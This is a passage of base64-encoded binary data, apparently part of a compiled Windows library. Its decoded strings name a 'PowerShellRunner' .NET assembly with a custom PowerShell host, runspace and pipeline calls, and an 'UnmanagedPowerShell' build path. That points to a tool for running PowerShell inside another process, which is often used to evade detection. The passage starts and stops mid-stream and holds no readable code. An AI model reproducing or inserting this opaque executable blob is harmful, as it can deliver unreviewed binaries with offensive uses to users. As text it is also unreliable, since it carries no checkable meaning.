JTaXplAF93aW5kb3dQb3NpdGlvbgBfd2luZG93VGl0bGUAZ2V0X0JhY2tncm91bmRDb2xvcgBzZXRfQmFja2dyb3VuZENvbG9yAGdldF9CdWZmZXJTaXplAHNldF9CdWZmZXJTaXplAGdldF9DdXJzb3JQb3NpdGlvbgBzZXRfQ3Vyc29yUG9zaXRpb24AZ2V0X0N1cnNvclNpemUAc2V0X0N1cnNvclNpemUARmx1c2hJbnB1dEJ1ZmZlcgBnZXRfRm9yZWdyb3VuZENvbG9yAHNldF9Gb3JlZ3JvdW5kQ29sb3IAQnVmZmVyQ2VsbABSZWN0YW5nbGUAR2V0QnVmZmVyQ29udGVudHMAZ2V0X0tleUF2YWlsYWJsZQBnZXRfTWF4UGh5c2ljYWxXaW5kb3dTaXplAGdldF9NYXhXaW5kb3dTaXplAEtleUluZm8AUmVhZEtleU9wdGlvbnMAUmVhZEtleQBTY3JvbGxCdWZmZXJDb250ZW50cwBTZXRCdWZmZXJDb250ZW50cwBnZXRfV2luZG93UG9zaXRpb24Ac2V0X1dpbmRvd1Bvc2l0aW9uAGdldF9XaW5kb3dTaXplAHNldF9XaW5kb3dTaXplAGdldF9XaW5kb3dUaXRsZQBzZXRfV2luZG93VGl0bGUAQmFja2dyb3VuZENvbG9yAEJ1ZmZlclNpemUAQ3Vyc29yUG9zaXRpb24AQ3Vyc29yU2l6ZQBGb3JlZ3JvdW5kQ29sb3IAS2V5QXZhaWxhYmxlAE1heFBoeXNpY2FsV2luZG93U2l6ZQBNYXhXaW5kb3dTaXplAFdpbmRvd1Bvc2l0aW9uAFdpbmRvd1NpemUAV2luZG93VGl0bGUAY29tbWFuZABleGl0Q29kZQBmb3JlZ3JvdW5kQ29sb3IAYmFja2dyb3VuZENvbG9yAHZhbHVlAG1lc3NhZ2UAc291cmNlSWQAcmVjb3JkAGNhcHRpb24AZGVzY3JpcHRpb25zAGNob2ljZXMAZGVmYXVsdENob2ljZQB1c2VyTmFtZQB0YXJnZXROYW1lAGFsbG93ZWRDcmVkZW50aWFsVHlwZXMAb3B0aW9ucwByZWN0YW5nbGUAc291cmNlAGRlc3RpbmF0aW9uAGNsaXAAZmlsbABvcmlnaW4AY29udGVudHMAU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q3VsdHVyZUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEFzc2VtYmx5VmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAFN5c3RlbS5EaWFnbm9zdGljcwBEZWJ1Z2dhYmxlQXR0cmlidXRlAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBJbml0aWFsU2Vzc2lvblN0YXRlAENyZWF0ZURlZmF1bHQAQXV0aG9yaXphdGlvbk1hbmFnZXIAc2V0X0F1dGhvcml6YXRpb25NYW5hZ2VyAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAQ29tbWFuZABnZXRfSXRlbQBQaXBlbGluZVJlc3VsdFR5cGVzAE1lcmdlTXlSZXN1bHRzAEFkZABJbnZva2UASURpc3Bvc2FibGUARGlzcG9zZQBTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABnZXRfQ3VycmVudFRocmVhZABOb3RJbXBsZW1lbnRlZEV4Y2VwdGlvbgBOZXdHdWlkAEFwcGVuZABTdHJpbmcAQ29uY2F0AEFwcGVuZExpbmUAVG9TdHJpbmcAc2V0X1dpZHRoAHNldF9IZWlnaHQAc2V0X1gAc2V0X1kAAAAXbwB1AHQALQBkAGUAZgBhAHUAbAB0AAEZQwB1AHMAdABvAG0AUABTAEgAbwBzAHQAAIF3RQBuAHQAZQByAE4AZQBzAHQAZQBkAFAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgXVFAHgAaQB0AE4AZQBzAHQAZQBkAFAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABAwoAAA9EAEUAQgBVAEcAOgAgAAAPRQBSAFIATwBSADoAIAAAE1YARQBSAEIATwBTAEUAOgAgAAATVwBBAFIATgBJAE4ARwA6ACAAAIFhUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBc1AAcgBvAG0AcAB0AEYAbwByAEMAaABvAGkAYwBlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgX1QAHIAbwBtAHAAdABGAG8AcgBDAHIAZQBkAGUAbgB0AGkAYQBsADEAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBfVAAcgBvAG0AcAB0AEYAbwByAEMAcgBlAGQAZQBuAHQAaQBhAGwAMgAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYFlUgBlAGEAZABMAGkAbgBlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgYFSAGUAYQBkAEwAaQBuAGUAQQBzAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABSUYAbAB1AHMAaABJAG4AcAB1AHQAQgB1AGYAZgBlAHIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABLRwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAQUsAZQB5AEEAdgBhAGkAbABhAGIAbABlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAgWNSAGUAYQBkAEsAZQB5ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQ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